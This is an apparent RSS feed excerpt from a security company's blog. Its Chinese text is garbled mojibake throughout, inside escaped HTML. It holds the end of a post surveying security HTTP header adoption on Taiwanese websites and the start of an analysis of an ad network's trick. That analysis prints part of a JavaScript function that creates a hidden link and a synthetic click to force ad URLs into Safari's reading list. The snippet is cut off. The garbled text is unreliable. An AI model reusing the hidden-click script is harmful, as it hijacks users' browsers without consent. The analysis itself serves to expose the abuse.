Á¥çÂÖ•Áà≤Âü∫Êú¨ÂäüËÉΩÔºåÂç≥‰ΩøÈñãÁôº‰∫∫Âì°‰∏çÊ∏ÖÊ•öÂ¶Ç‰Ωï‰øÆÊîπ‰º∫ÊúçÂô®Áõ∏ÈóúË®≠ÂÆöÔºå‰πüÂèØ‰ª•‰æùÈù† framework Êèê‰æõÁöÑÊñπÂºè‰æÜ‰ΩøÁî®ÈÄô‰∫õ headers„ÄÇÂõ†Ê≠§‰ΩøÁî®ÈÄô‰∫õ headers ‰æÜÊèêÂçáÁ∂≤Á´ôÂÆâÂÖ®ÊÄßÂ∞±ÊàêÁà≤È†óÂÖ∑ CP ÂÄºÁöÑÊñπÂºè„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁõÆÂâçÊúÄÂ∏∏Ë¶ãÁöÑË≥áÂÆâÁõ∏Èóú HTTP headers ÂèØÂèÉËÄÉ &lt;a href=&quot;https://www.owasp.org/index.php/List_of_useful_HTTP_headers&quot;&gt;OWASP Á∂≤Á´ô&lt;/a&gt; ÊâÄÊ¢ùÂàóÁöÑÂÖßÂÆπÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy (X-Content-Security-Policy„ÄÅX-Webkit-CSP ÈÉΩÊòØÂêå‰∏ÄÁ≥ªÂàó)&lt;/li&gt;
  &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
  &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
  &lt;li&gt;X-Frame-Options&lt;/li&gt;
  &lt;li&gt;X-XSS-Protection&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÈÇÑÊúâ‰∏Ä‰∫õÂÖ∂‰ªñÁöÑË≥áÂÆâÁõ∏Èóú HTTP headers ‰πüÂÄºÂæóÊ≥®ÊÑèÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Access-Control-Allow-Origin&lt;/li&gt;
  &lt;li&gt;X-Download-Options&lt;/li&gt;
  &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÊúÄÂæåÊúâ‰∏ÄÈ†ÖÊØîËºÉÁâπÂà•ÁöÑÊòØ Cookie ÁöÑÂÆâÂÖ®Ë®≠ÂÆöÔºåÁî±Êñº Cookie ‰πüÊòØ HTTP headers ÁöÑ‰∏ÄÈÉ®‰ªΩÔºåÂõ†Ê≠§Êú¨Êñá‰πüÂ∞áÂÖ∂ÂàóÂá∫Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
  &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰∏äËø∞ headers ÁöÑÊï∏ÈáèÊòØ‰∏çÊòØÁ®çÂæÆË∂ÖÈÅé‰Ω†ÁöÑÊÉ≥ÂÉèÔºüÂÖ∂ÂØ¶ÈÄô‰∫õÊäÄË°ìÊó©Â∑≤Ë¢´ÂæàÂ§öÂ§ßÂÖ¨Âè∏Êé°Áî®ÔºåÂÉèÊòØ Google„ÄÅFacebook„ÄÅTwitter Á≠âÂ∏∏Ë¶ãÁöÑÁ∂≤Ë∑ØÊúçÂãôÈÉΩÂèØÁúãÂà∞ÈÄô‰∫õ headers ÁöÑËπ§ÂΩ±„ÄÇ‰∏ãÈù¢ÈÄôÂºµÂúñÁâá‰ΩøÁî® Chrome ÁöÑ Inspector ‰æÜËßÄÂØü Twitter ÁöÑ HTTP response ÂÖßÂÆπÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot; alt=&quot;Twitter ÁöÑ HTTP reponse&quot; title=&quot;Twitter ÁöÑ HTTP reponse&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂæûÁï´Á¥ÖÁ∑öÁöÑÈÉ®ÂàÜÊàëÂÄëÂèØÁúãÂà∞ Twitter Âú® Cookie Ë®≠ÂÆö‰∫Ü Secure Ëàá HttpOnly ÈÄôÂÖ©ÂÄãÂ±¨ÊÄßÔºå‰∏¶‰∏îÊé°Áî®‰∫Ü Strict-Transport-Security„ÄÅX-Content-Type-Options„ÄÅX-Frame-Options„ÄÅX-XSS-Protection ÈÄôÂπæÁ®Æ headers„ÄÇ&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúË¶∫ÂæóÁî®ÂúñÂΩ¢ÁïåÈù¢Â§™È∫ªÁÖ©Ôºå‰πüÂèØ‰ª•‰ΩøÁî® command line ÁöÑÂ∑•ÂÖ∑‰æÜËßÄÂØü„ÄÇ‰∏ãÈù¢ÈÄôÂºµÂúñÁâá‰ΩøÁî® curl ‰æÜËßÄÂØü Facebook ÁöÑ HTTP response ÂÖßÂÆπÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot; alt=&quot;Facebook ÁöÑ HTTP response&quot; title=&quot;Facebook ÁöÑ HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;‰∏äËø∞Ë≥áÂÆâÁõ∏ÈóúÁöÑ-headers-ÊÉ≥Ëß£Ê±∫Âì™‰∫õÂïèÈ°å&quot;&gt;‰∏äËø∞Ë≥áÂÆâÁõ∏ÈóúÁöÑ headers ÊÉ≥Ëß£Ê±∫Âì™‰∫õÂïèÈ°åÔºü&lt;/h3&gt;

&lt;p&gt;ÁõÆÂâçÈÄô‰∫õË≥áÂÆâÁõ∏ÈóúÁöÑ HTTP headers ÊÉ≥Ëß£Ê±∫ÁöÑÂïèÈ°å‰∏ªË¶ÅÂèØÂàÜÁÇ∫‰ª•‰∏ã‰∫îÂ§ßÈ°ûÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Èò≤Á¶¶ XSS (Cross Site Scripting)Ôºö
    &lt;ul&gt;
      &lt;li&gt;Content-Security-Policy&lt;/li&gt;
      &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
      &lt;li&gt;X-XSS-Protection&lt;/li&gt;
      &lt;li&gt;X-Download-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Èò≤Á¶¶ ClickjackingÔºö
    &lt;ul&gt;
      &lt;li&gt;X-Frame-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âº∑Âåñ HTTPS Ê©üÂà∂Ôºö
    &lt;ul&gt;
      &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
      &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÈÅøÂÖçÁÄèË¶ΩÂô®Ë™§Âà§Êñá‰ª∂ÂΩ¢ÊÖãÔºö
    &lt;ul&gt;
      &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‰øùË≠∑Á∂≤Á´ôË≥áÊ∫êÂà•Ë¢´‰ªªÊÑèÂ≠òÂèñÔºö
    &lt;ul&gt;
      &lt;li&gt;Access-Control-Allow-OriginÔºàÊ≠§ header Ëã•Ë®≠ÂÆöÈåØË™§ÊúÉÈÅ©ÂæóÂÖ∂ÂèçÔºÅÔºâ&lt;/li&gt;
      &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂÖ∂‰∏≠ &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)&quot;&gt;XSS&lt;/a&gt; Ëàá &lt;a href=&quot;https://www.owasp.org/index.php/Clickjacking&quot;&gt;Clickjacking&lt;/a&gt; ÊòØÁõÆÂâçÂ∏∏Ë¶ãÁöÑÊîªÊìäÊâãÊ≥ïÔºåÂ∞§ÂÖ∂ XSS ÁõÆÂâç‰ªçÈ´òÂ±Ö &lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;OWASP Top 10 2013 ÁöÑÁ¨¨‰∏âÂêç&lt;/a&gt;ÔºåÂÖ∂Âö¥ÈáçÊÄßÂèØË¶ã‰∏ÄÊñë„ÄÇËÄåÂú®ÊàëÂÄëÂü∑Ë°åÈÅéÁöÑË®±Â§ö&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;Êª≤ÈÄèÊ∏¨Ë©¶&lt;/a&gt;Ê°à‰πã‰∏≠ÔºåË¢´ÊàëÂÄëÊâæÂá∫ XSS Âº±ÈªûÁöÑÁ∂≤Á´ôÈ´òÈÅî‰πùÊàêÔºÅÂØ¶Âú®ÊòØ‰∏çËÉΩËºïÂøΩÈÄô‰∫õÂïèÈ°å„ÄÇËã•ËÉΩÈôç‰ΩéÈÄô‰∫õÊâãÊ≥ïÊîªÊìäÊàêÂäüÁöÑÊ©üÁéáÔºå‰ºÅÊ•≠ÁöÑÂà©ÁõäÂ∞±ËÉΩÊúâÊõ¥Â§öÁöÑÂÆâÂÖ®‰øùÈöúÔºåÂÆ¢Êà∂Â∞ç‰ºÅÊ•≠ÁöÑ‰ø°Ë≥¥‰∫¶ÊúÉÊõ¥Âä†Á©©Âõ∫„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÁõÆÂâçÈÄô‰∫õ-headers-ÁöÑ‰ΩøÁî®ÁãÄÊ≥Å&quot;&gt;ÁõÆÂâçÈÄô‰∫õ headers ÁöÑ‰ΩøÁî®ÁãÄÊ≥ÅÔºü&lt;/h3&gt;

&lt;p&gt;ÈÄôÈ∫ºÁ∞°‰æøÁöÑÂü∫Êú¨Èò≤Á¶¶ÊñπÂºèÔºåÁêÜÁï∂Âª£ÁÇ∫‰ºÅÊ•≠ÊâÄÊé°Áî®ÔºåÂõ†Ê≠§ÊàëÂÄëÈáùÂ∞ç &lt;a href=&quot;http://www.alexa.com/topsites/countries/TW&quot;&gt;Alexa Taiwan Top 525&lt;/a&gt; ‰∏≠ÊåëÂá∫ 513 ÂÄãÂèØÊ≠£Â∏∏‰ΩøÁî®ÁöÑÁ∂≤Á´ôÔºàÂí¶Ôºü‰∏ÄËà¨‰∏çÊòØ Top 500 ÂóéÔºüÊàëÊ≤íÈ®ô‰Ω†Ôºå&lt;a href=&quot;http://www.alexa.com/topsites/countries;20/TW&quot;&gt;ÁúüÁöÑÊúâ 525&lt;/a&gt;ÔºâÔºåË™øÊü•ÈÄô‰∫õÁ∂≤Á´ôÊòØÂê¶‰ΩøÁî®Êüê‰∫õÂ∏∏Ë¶ãÁöÑ HTTP headers„ÄÇÁµêÊûúÁõ∏Áï∂‰ª§‰∫∫Â§±ÊúõÔºåË®±Â§öÁ∂≤Á´ôÈÉΩÊú™Êé°Áî®ÈÄô‰∫õ headers„ÄÇÁµ±Ë®àÊï∏ÊìöÂ¶Ç‰∏ãÂúñÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot; alt=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; title=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂæûÁµ±Ë®àÁµêÊûú‰∏≠ÂèØÁôºÁèæÊúÄÂ§ö‰∫∫‰ΩøÁî®ÁöÑ HttpOnly Âè™Êúâ 21.25%ÔºåÊéíÂêçÁ¨¨‰∫åÁöÑ X-Frame-Options ‰πüÂè™Êúâ 7.80%„ÄÇËÄå‰∏îÈÄô‰∫õÊï∏ÊìöÂ∞öÊú™Â∞á Google„ÄÅTwitter Á≠âÂ§ßÂÖ¨Âè∏ÊéíÈô§ÔºåËã•Â∞áÂâçËø∞ÂúãÈöõÂÖ¨Âè∏ÊéíÈô§ÂæåÔºåÈÄô‰∫õÊØîÁéáÊÅêÊÄïÊúÉÊõ¥‰Ωé„ÄÇ&lt;/p&gt;

&lt;p&gt;‰∏çÈÅéÂú®‰∏äËø∞Á∂≤Á´ô‰∏≠Êúâ‰∏çÂ∞ëÂÖ•Âè£Á∂≤Á´ô„ÄÅÊº´Áï´Á∂≤Á´ô„ÄÅËâ≤ÊÉÖÁ∂≤Á´ôÔºåÊàñÊòØÂÖ¨Âè∏‰∏¶ÈùûÂè∞ÁÅ£‰ºÅÊ•≠ÔºåÁÑ°Ê≥ïÂèçÊáâÂè∞ÁÅ£ÁöÑ‰ΩøÁî®ÁãÄÊ≥Å„ÄÇÊÅ∞Â•ΩÂú® 2012 Âπ¥ 10 ÊúàÂè∞ÁÅ£ÊúâË®±Â§öÁ∂≤Ë∑ØÊúçÂãôÂÖ¨Âè∏‰∏ÄÂêåÊàêÁ´ã‰∫Ü &lt;a href=&quot;http://www.tieataiwan.org/index.php&quot;&gt;TIEA Âè∞ÁÅ£Á∂≤Ë∑ØÊö®ÈõªÂ≠êÂïÜÂãôÁî¢Ê•≠ÁôºÂ±ïÂçîÊúÉ&lt;/a&gt;ÔºåÁõÆÂâçÁ∂≤Á´ô‰∏äÁöÑ&lt;a href=&quot;http://www.tieataiwan.org/member.php&quot;&gt;ÊúÉÂì°ÂêçÂñÆ&lt;/a&gt;‰∏≠Êúâ 116 ÂÄãÊúÉÂì°ÔºåÂÖ∂‰∏≠‰∏çÂ∞ëÈ†óÂÖ∑‰ª£Ë°®ÊÄßÔºåÊ≠£Â•ΩÂèØËßÄÂØüÈÄô‰∫õÂÖ¨Âè∏ÁáüÈÅãÁöÑÁ∂≤Á´ôÊòØÂê¶ÊúâÊé°Áî®ÈÄô‰∫õ headers„ÄÇÁµ±Ë®àÊï∏ÊìöÂ¶Ç‰∏ãÂúñÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot; alt=&quot;HTTP headers statistic of TIEA&quot; title=&quot;HTTP headers statistic of TIEA&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂæàÂèØÊÉúÂú∞ÔºåÊâÄÊúâ headers ÁöÑÊé°Áî®ÁéáÊØîËµ∑‰∏ä‰∏Ä‰ªΩÊï∏ÊìöÈÉΩÈÇÑË¶Å‰Ωé„ÄÇÈô§ÈùûÂÖ¨Âè∏Á∂≤Á´ôÂÉÖ‰ΩøÁî®ÈùúÊÖãÈ†ÅÈù¢ÔºåÁ∂≤Á´ô‰∏äÊ≤íÊúâ‰ªª‰ΩïÂïÜÊ•≠ÈÇèËºØ„ÄÅÂ∏≥Ëôü„ÄÅÂÄãË≥áÔºåÂê¶ÂâáÊáâË©≤ÈÉΩË¶Å‰ΩøÁî®ÂêàÈÅ©ÁöÑ headers ÁÇ∫‰Ω†ÁöÑË≥áÂÆâÈò≤Á¶¶Â∑•‰∫ãÂ§öÁØâ‰∏ÄÈÅìÁâÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÄå‰∏îÁî±Êñº meeya ÁõÆÂâçÊ≤íÊúâÊ≠£ÂºèÂÆòÁ∂≤ÔºåÊòØÁõ¥Êé•‰ΩøÁî® facebook Á≤âÁµ≤È†Å‰ΩúÁÇ∫ÂÆòÁ∂≤ÔºåÂõ†Ê≠§ Content-Security-Policy„ÄÅSet-Cookie Secure„ÄÅStrict-Transport-Security„ÄÅX-Content-Type-Options„ÄÅX-Frame-Options„ÄÅX-XSS-Protection Á≠âÂÖ≠È†Ö headers ÁöÑÁµ±Ë®àÊï∏ÈáèÈÉΩÈÇÑË¶ÅÂÜçÊ∏õ‰∏ÄÔºåÈ†ìÊôÇ Content-Security-Policy Ëàá Strict-Transport-Security ÁöÑÁ∏ΩÊï∏ÈáèÁöÜÈôçËá≥ 0 ÂÄã„ÄÇÊ≠§ÁãÄÊ≥ÅÈ°ØÁ§∫Âá∫ÔºåÂç≥‰ΩøÊòØÂú®‰∏Ä‰∫õÂè∞ÁÅ£‰∏ªÊµÅÁöÑÁ∂≤Á´ô‰∏≠ÔºåÁõ∏ÈóúÁáüÈÅã‰∫∫Âì°Âú®Ë≥áÂÆâÈ†òÂüü‰ªçÊúâË®±Â§öÂä™ÂäõËàáÂ≠∏ÁøíÁöÑÁ©∫Èñì„ÄÇ&lt;/p&gt;

&lt;p&gt;Ë®±Â§öÂè∞ÁÅ£‰ºÅÊ•≠Á∂ìÂ∏∏È°ßËëóË°ùÊ•≠Á∏æ„ÄÅÈñãÁôºÊñ∞ÂäüËÉΩ„ÄÅË∂ïËëóËÆìÊñ∞ÊúçÂãô‰∏äÁ∑öÔºåÂçªÂøΩÁï•‰∫ÜÈùûÂ∏∏ÈáçË¶ÅÁöÑÂü∫Á§éË≥áÂÆâÂª∫Ë®≠ÔºåÂæÄÂæÄÊòØÂú®ÈÅ≠Âà∞ÊîªÊìäÂæåÊâçÂ§ßÂëºÊêçÂ§±ÊÖòÈáçÔºåÁîöËá≥ÊòØÂ∑≤Ë¢´Êª≤ÈÄè‰∫ÜËÄå‰∏çËá™Áü•ÔºåÂÖ∂‰ºÅÊ•≠Âà©ÁõäËàáÊ∞ëÁúæÂÄãË≥áÁöÑ‰øùÈöúÁöÜÁõ∏Áï∂‰ª§‰∫∫ÊìîÊÜÇ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;‰∏ãÈõÜÈ†êÂëä&quot;&gt;‰∏ãÈõÜÈ†êÂëä&lt;/h3&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÊú¨ÊñáÁöÑÁ∫å‰ΩúÊàëÂÄëÊúÉÂàÜÂπæÂÄãÁØáÁ´†Ë©≥Ë´áÂêÑÁ®Æ headers ÁöÑ‰ΩøÁî®ÊñπÂºè‰∏¶‰ªãÁ¥πÂØ¶ÈöõÊ°à‰æãÔºå‰∏ã‰∏ÄÁØáÂ∞áÊúÉÊé¢Ë®éÂ∞àÈñÄÈò≤Á¶¶ XSS ÁöÑ HTTP headersÔºåÊï¨Ë´ãÊúüÂæÖÔºÅÁ≠â‰∏çÂèäÁöÑÊúãÂèãÂÄëÂ∞±Ë´ãÂÖàÁî®‰∏äÈù¢ÁöÑ‰∏Ä‰∫õÈóúÈçµÂ≠óËá™Ë°å‰∏äÁ∂≤Êü•Ë©¢ÂõâÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/</link>
                <guid>https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1</guid>
                <pubDate>Mon, 10 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Â•áÂÑ™Âª£Âëä Qiyou Âª£ÂëäÊâãÊ≥ïÂâñÊûê</title>
                <description>&lt;p&gt;Ê≠°Ëøé‰æÜÂà∞ÊàëÂÄëÁöÑÊäÄË°ìÊñáÁ´†Â∞àÊ¨ÑÔºÅ&lt;/p&gt;

&lt;p&gt;‰ªäÂ§©ÊàëÂÄë‰æÜË´áË´á„ÄåÂª£ÂëäÈ°ØÁ§∫ÊâãÊ≥ï„Äç„ÄÇ‰∏çÂ∞ëÂª£ÂëäÂïÜÁÇ∫‰∫ÜË¶ÅÂ¢ûÂä†Âª£ÂëäÁöÑÊõùÂÖâ‰ª•ÂèäÈªûÊìäÁéáÔºåÊúÉ‰ΩøÁî®ÂêÑÁ®ÆÊâãÊ≥ïÂº∑Ëø´‰ΩøÁî®ËÄÖÈ°ØÁ§∫Âª£Âëä„ÄÇ‰æãÂ¶ÇÂΩàÂá∫ÂºèË¶ñÁ™ó„ÄÅÂÖßÂµåÂª£Âëä„ÄÅÂº∑Âà∂Ë∑≥ËΩâÁ≠âÁ≠â„ÄÇ‰ΩÜÈÄôÊ®£ÁöÑÊâãÊ≥ïÊúâ‰ªÄÈ∫ºÂ•ΩÊèêÁöÑÂë¢Ôºü‰ªäÂ§©Êúâ‰∏ÄÂÄãÂæàÁâπÂà•ÁöÑÊ°à‰æãÔºåËÆìÊàëÂÄë‰æÜÁúãÁúã‰∏ÄÂÄãÁ∂≤Á´ô„Äå&lt;a href=&quot;http://1kkk.com&quot;&gt;1kkk.com Ê•µÈÄüÊº´Áï´&lt;/a&gt;„Äç„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_02.png&quot; alt=&quot;Â•áÂÑ™Âª£Âëä Qiyou Âª£ÂëäÊâãÊ≥ïÂâñÊûê - 1kkk.com&quot; title=&quot;Â•áÂÑ™Âª£Âëä Qiyou Âª£ÂëäÊâãÊ≥ïÂâñÊûê - 1kkk.com&quot; /&gt;
ÈÄôÊòØ‰∏ÄÂÄãÂ∏∏Ë¶ãÁöÑÁ∂≤Ë∑ØÊº´Áï´Á∂≤Á´ôÔºåÊé•ËëóÈªûÊìäÈÄ≤ÂéªÊº´Áï´È†ÅÈù¢„ÄÇ
&lt;!-- more --&gt;
&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_03.png&quot; alt=&quot;Â•áÂÑ™Âª£Âëä Qiyou Âª£ÂëäÊâãÊ≥ïÂâñÊûê - 1kkk.com Êº´Áï´È†ÅÈù¢&quot; title=&quot;Â•áÂÑ™Âª£Âëä Qiyou Âª£ÂëäÊâãÊ≥ïÂâñÊûê - 1kkk.com Êº´Áï´È†ÅÈù¢&quot; /&gt;
Á∂≤Á´ô‰∏≠ÂÖÖÊñ•ËëóÁÖ©‰∫∫ÁöÑÂª£ÂëäÔºå‰∏¶‰∏îÁ™ÅÁÑ∂‰∏ÄÈñÉËÄåÈÅé Safari ÁöÑ„ÄåÈñ±ËÆÄÂàóË°®„ÄçÂãïÁï´„ÄÇÊÄéÈ∫ºÊúÉÁ™ÅÁÑ∂ÈÄôÊ®£Âë¢ÔºüËÆìÊàëÂÄëÊâìÈñã„ÄåÈñ±ËÆÄÂàóË°®„Äç‰∏ÄÊé¢Á©∂Á´ü„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_04.png&quot; alt=&quot;Â•áÂÑ™Âª£Âëä Qiyou Âª£ÂëäÊâãÊ≥ïÂâñÊûê - Safari È°ØÁ§∫Èñ±ËÆÄÂÅ¥ÈÇäÊ¨Ñ&quot; title=&quot;Â•áÂÑ™Âª£Âëä Qiyou Âª£ÂëäÊâãÊ≥ïÂâñÊûê - Safari È°ØÁ§∫Èñ±ËÆÄÂÅ¥ÈÇäÊ¨Ñ&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_05.png&quot; alt=&quot;Â•áÂÑ™Âª£Âëä Qiyou Âª£ÂëäÊâãÊ≥ïÂâñÊûê - Safari Èñ±ËÆÄÂàóË°®Ë¢´ÊîæÁΩÆÂª£Âëä URL&quot; title=&quot;Â•áÂÑ™Âª£Âëä Qiyou Âª£ÂëäÊâãÊ≥ïÂâñÊûê - Safari Èñ±ËÆÄÂàóË°®Ë¢´ÊîæÁΩÆÂª£Âëä URL&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊâìÈñãÈñ±ËÆÄÂàóË°®‰πãÂæåÔºåÊàëÂÄëËµ´ÁÑ∂ÁôºÁèæË£°Èù¢Ë¢´Âä†‰∫ÜÈùûÂ∏∏Â§öÂª£ÂëäÁöÑÈ†ÅÈù¢ÔºÅ&lt;/p&gt;

&lt;p&gt;ÂèØ‰ª•Áúã‰ª•‰∏ãÂΩ±ÁâáÁ§∫ÁØÑÔºö&lt;/p&gt;
&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/E-BGf1MwecU&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;ÈÄôÊòØÊÄéÈ∫ºÂÅöÂà∞ÁöÑÂë¢ÔºüÂ∞±ÊòØ‰∏ÄÁ®ÆÂà©Áî® JavaScript ÊéßÂà∂ÊªëÈº†ÈªûÊìäÁöÑËÆäÂΩ¢ÊáâÁî®„ÄÇÈªûÈÅ∏„ÄåÁ∂≤È†ÅÊ™¢Èñ±Âô®„ÄçÊàñÊòØ„ÄåÈñãÁôºËÄÖÂ∑•ÂÖ∑„ÄçÔºåÊúÉÁúãÂà∞‰∏ÄÊÆµÂ•áÊÄ™ÁöÑ JavaScript ÊéßÂà∂ÊªëÈº†ÁöÑÈªûÊìäË°åÁÇ∫„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_06.png&quot; alt=&quot;Â•áÂÑ™Âª£Âëä Qiyou Âª£ÂëäÊâãÊ≥ïÂâñÊûê - Âª£Âëä JavaScript&quot; title=&quot;Â•áÂÑ™Âª£Âëä Qiyou Âª£ÂëäÊâãÊ≥ïÂâñÊûê - Âª£Âëä JavaScript&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂàÜÊûêÁØÄÈåÑÂæåÁöÑ code Â¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;display:none;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;MouseEvents&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
